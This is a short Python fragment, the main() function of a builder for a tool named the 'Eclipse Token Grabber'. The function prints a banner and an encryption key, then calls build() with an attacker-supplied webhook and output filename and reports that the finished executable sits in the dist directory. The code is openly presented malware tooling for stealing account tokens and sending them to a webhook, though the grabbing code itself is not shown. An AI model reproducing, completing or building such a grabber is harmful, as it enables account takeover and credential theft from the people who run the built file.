...
def main(args: Namespace):
    ...
    clear_screen()
    print(start_banner)
    print(f"{good} Encryption Key: {fernet_key}")
    print(f"{good} Building Eclipse Token Grabber, please wait...")
    build(args.webhook, args.filename, args.debug)
    print(f"{good} Successfully Built, You can find it inside the dist directory!\n")
